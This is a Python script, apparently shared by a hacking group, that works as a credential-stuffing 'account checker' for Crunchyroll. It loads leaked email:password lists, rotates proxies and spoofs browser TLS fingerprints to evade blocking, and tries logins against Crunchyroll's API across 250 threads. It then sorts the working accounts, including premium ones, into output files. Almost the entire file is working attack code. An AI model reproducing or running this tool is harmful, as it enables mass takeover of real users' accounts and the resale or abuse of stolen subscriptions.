import os, sys, json, time, random, string, ctypes, concurrent.futures

try:
    import requests
    import colorama
    import pystyle
    import datetime
    import uuid
    import functools
except ModuleNotFoundError:
    os.system("pip install requests")
    os.system("pip install colorama")
    os.system("pip install pystyle")
    os.system("pip install datetime")
    os.system("pip install uuid")
    os.system("pip install functools")

from colorama import Fore, Style
from tls_client import Session
from random import choice
from json import dumps
from pystyle import System, Colors, Colorate, Write
from concurrent import futures
from uuid import uuid4

red = Fore.RED
yellow = Fore.YELLOW
green = Fore.GREEN
blue = Fore.BLUE
orange = Fore.RED + Fore.YELLOW
pretty = Fore.LIGHTMAGENTA_EX + Fore.LIGHTCYAN_EX
magenta = Fore.MAGENTA
lightblue = Fore.LIGHTBLUE_EX
cyan = Fore.CYAN
gray = Fore.LIGHTBLACK_EX + Fore.WHITE
reset = Fore.RESET
pink = Fore.LIGHTGREEN_EX + Fore.LIGHTMAGENTA_EX
dark_green = Fore.GREEN + Style.BRIGHT

invalid = 0
valid = 0
custom = 0
premium = 0
proxy_error = 0
accounts_processed = 0

start_time = time.time()
ctypes.windll.kernel32.SetConsoleTitleW(f'Crunchyroll Account Checker | Valid : {valid} | Invalid : {invalid} | Custom : {custom} | Premium : {premium} | Proxy Error : {proxy_error} | .gg/hcuxjpSfkU')

def update_console_title():
    global valid, invalid, custom, premium, proxy_error, start_time, accounts_processed
    current_time = time.time()
    elapsed_time = current_time - start_time
    cpm = int((accounts_processed / elapsed_time) * 60)
    ctypes.windll.kernel32.SetConsoleTitleW(f'Crunchyroll Account Checker | Valid : {valid} | Invalid : {invalid} | Custom : {custom} | Premium : {premium} | Proxy Error : {proxy_error} | CPM : {cpm} | .gg/hcuxjpSfkU')

def my_ui():
    Write.Print(f"""
\t\t   ______                      __                     ____
\t\t  / ____/______  ______  _____/ /_  __  ___________  / / /
\t\t / /   / ___/ / / / __ \/ ___/ __ \/ / / / ___/ __ \/ / / 
\t\t/ /___/ /  / /_/ / / / / /__/ / / / /_/ / /  / /_/ / / /  
\t\t\____/_/   \__,_/_/ /_/\___/_/ /_/\__, /_/   \____/_/_/   
\t\t                                 /____/                     [ .gg/hcuxjpSfkU ] 
\t\t   ________              __                                 [ github.com/H4cK3dR4Du ]
\t\t  / ____/ /_  ___  _____/ /_____  _____                     [ imh4ck3dr4du ]
\t\t / /   / __ \/ _ \/ ___/ //_/ _ \/ ___/
\t\t/ /___/ / / /  __/ /__/ ,< /  __/ /    
\t\t\____/_/ /_/\___/\___/_/|_|\___/_/     

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

""", Colors.yellow_to_red, interval=0.000)

my_ui()
time.sleep(3)

def get_time_rn():
    date = datetime.datetime.now()
    hour = date.hour
    minute = date.minute
    second = date.second
    timee = "{:02d}:{:02d}:{:02d}".format(hour, minute, second)
    return timee

def crunchy_checker(email, password):
    global invalid, valid, custom, premium, proxy_error, accounts_processed
    proxy = choice(open("proxies.txt", "r").readlines()).strip() if len(open("proxies.txt", "r").readlines()) != 0 else None

    session = Session(client_identifier="chrome_114", random_tls_extension_order=True)

    if proxy.count(":") == 1:
        session.proxies = {
            "http": "http://" + proxy,
            "https": "http://" + proxy
        }
    elif proxy.count(":") == 3:
        username, password, ip, port = proxy.split(":")
        session.proxies = {
            "http": f"http://{username}:{password}@{ip}:{port}",
            "https": f"http://{username}:{password}@{ip}:{port}"
        }
    try:
        guid = str(uuid4)

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept-Language": "en-US"
        }

        payload = f"device_type=com.crunchyroll.windows.desktop&device_id={guid}&access_token=LNDJgOit5yaRIWN"

        req = session.post(f"https://api.crunchyroll.com/start_session.0.json", headers=headers, data=payload)
        session_id = req.json()['data']['session_id']

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept-Language": "en-US"
        }

        payload = {
            'account': email,
            'password': password,
            'session_id': session_id,
            'locale': 'enUS',
            'version':' 1.3.1.0',
            'connectivity_type': 'ethernet'
        }

        login = session.post("https://api.crunchyroll.com/login.0.json", headers=headers, data=payload)
        if any(key in login.text for key in ['You forgot to put in your password.','Incorrect login information.']):
            invalid += 1
            accounts_processed += 1
            time_rn = get_time_rn()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Invalid {gray}|{pink} {email}{gray}:{pink}{password}{gray}")
            update_console_title()
            return
        elif '"premium":""' in login.text:
            custom += 1
            accounts_processed += 1
            time_rn = get_time_rn()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({lightblue}~{gray}) {pretty}Custom {gray}|{pink} {email}{gray}:{pink}{password}{gray}")
            update_console_title()
            folder = "Checked"
            if not os.path.exists(folder):
                os.makedirs(folder)
            with open("Checked/custom_crunchyroll.txt", "a+", encoding='utf-8') as crunchyroll_penis2:
                crunchyroll_penis2.write(f"{email}:{password} | A2F" + "\n")
            return
        elif '"user_id"' not in login.text:
            raise

        valid += 1
        accounts_processed += 1
        update_console_title()
        subscription = login.json()["data"]["user"]["access_type"]
        folder = "Checked"
        if not os.path.exists(folder):
            os.makedirs(folder)

        if subscription == "premium":
            time_rn = get_time_rn()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Valid {gray}|{pink} {email}{gray}:{pink}{password}{gray} | {green}Premium")
            with open("Checked/good_crunchyroll_premium.txt", "a+", encoding='utf-8') as premium_file:
                premium_file.write(f"{email}:{password} | Subscription: {subscription}" + "\n")
            premium += 1
            accounts_processed += 1
            update_console_title()
            return
        else:
            time_rn = get_time_rn()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Valid {gray}|{pink} {email}{gray}:{pink}{password}{gray} | {yellow}No Premium")
            with open("Checked/good_crunchyroll.txt", "a+", encoding='utf-8') as regular_file:
                regular_file.write(f"{email}:{password} | Subscription: {subscription}" + "\n")
            return
    except:
        proxy_error += 1
        update_console_title()

accounts = []

with open('accounts.txt', 'r') as file:
    for line in file:
        line = line.strip()
        if ':' in line:
            email, password = line.split(':')
            accounts.append((email.strip(), password.strip()))

def process_account(email, password):
    crunchy_checker(email, password)

max_threads = 250

with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
    futures = [executor.submit(process_account, email, password) for email, password in accounts]
    concurrent.futures.wait(futures)